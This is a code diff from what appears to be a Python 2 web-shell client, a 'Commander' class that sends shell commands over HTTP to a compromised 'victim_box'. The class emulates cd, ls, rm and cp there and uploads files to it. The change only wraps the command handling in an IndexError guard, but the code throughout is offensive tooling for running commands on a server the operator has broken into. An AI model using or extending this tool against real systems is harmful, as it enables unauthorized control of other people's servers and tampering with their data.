@@ -86,48 +86,51 @@ class Commander(object):
                             victim_box.upload_file(lfile_path, rfile_path)
 
                     else:
-                        if command.split()[0] == 'cd' and len(command.split()) > 1:
-                            cwd = self.cwd
-                            if '../' in command.split()[-1] or '..' in command.split()[-1]:
-                                self.cwd = cwd.rstrip(cwd.split('/').pop()).rstrip('/')
-                            else:
-                                if command.split()[-1].startswith('/'):
-                                    make_request.cmd = '[ -d {0} ] && echo is_valid'.format(command.split()[-1])
-                                    if make_request.get_page_source().read().strip() == 'is_valid':
-                                        self.cwd = command.split()[-1]
-                                    else:
-                                        print 'bash: cd: {}: No such file or directory'.format(command.split()[01])
+                        try:
+                            if command.split()[0] == 'cd' and len(command.split()) > 1:
+                                cwd = self.cwd
+                                if '../' in command.split()[-1] or '..' in command.split()[-1]:
+                                    self.cwd = cwd.rstrip(cwd.split('/').pop()).rstrip('/')
                                 else:
-                                    make_request.cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
-                                    if make_request.get_page_source().read().strip() == 'is_valid':
-                                        self.cwd = '{0}/{1}'.format(cwd, command.split()[-1])
+                                    if command.split()[-1].startswith('/'):
+                                        make_request.cmd = '[ -d {0} ] && echo is_valid'.format(command.split()[-1])
+                                        if make_request.get_page_source().read().strip() == 'is_valid':
+                                            self.cwd = command.split()[-1]
+                                        else:
+                                            print 'bash: cd: {}: No such file or directory'.format(command.split()[01])
                                     else:
-                                        print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
+                                        make_request.cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
+                                        if make_request.get_page_source().read().strip() == 'is_valid':
+                                            self.cwd = '{0}/{1}'.format(cwd, command.split()[-1])
+                                        else:
+                                            print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
 
-                        elif command.split()[0] == 'cd' and len(command.split()) == 1:
-                            self.cwd = victim_box.cwd  # dirty patch
+                            elif command.split()[0] == 'cd' and len(command.split()) == 1:
+                                self.cwd = victim_box.cwd  # dirty patch
 
-                        else:
-                            # setting aliases for some commands to avoid
-                            # issues realted to empty directorie
-                            command = command.replace('ls', 'ls -lha') if command.split()[0] == 'ls' else command
-                            command = command.replace('rm', 'rm -v') if command.split()[0] == 'rm' else command
-                            command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
-                            command = command.replace('ifconfig', '/sbin/ifconfig')
-                            make_request.cmd = 'cd {0};{1}'.format(self.cwd, command)
-
-                            # get the source code cotenets
-                            source = make_request.get_page_source().read()
-                            if source:
-                                print source.rstrip()
-
-                            # if the executed command doesn't exist
                             else:
-                                errmsg = '{}: command not found'.format(unquote(command))
-                                if command.split()[0] == 'echo':
-                                    pass
+                                # setting aliases for some commands to avoid
+                                # issues realted to empty directorie
+                                command = command.replace('ls', 'ls -lha') if command.split()[0] == 'ls' else command
+                                command = command.replace('rm', 'rm -v') if command.split()[0] == 'rm' else command
+                                command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
+                                command = command.replace('ifconfig', '/sbin/ifconfig')
+                                make_request.cmd = 'cd {0};{1}'.format(self.cwd, command)
+
+                                # get the source code cotenets
+                                source = make_request.get_page_source().read()
+                                if source:
+                                    print source.rstrip()
+
+                                # if the executed command doesn't exist
                                 else:
-                                    print errmsg
+                                    errmsg = '{}: command not found'.format(unquote(command))
+                                    if command.split()[0] == 'echo':
+                                        pass
+                                    else:
+                                        print errmsg
+                        except IndexError:
+                            pass
 
                 # exist icommand if user provides exit as a command
                 else:
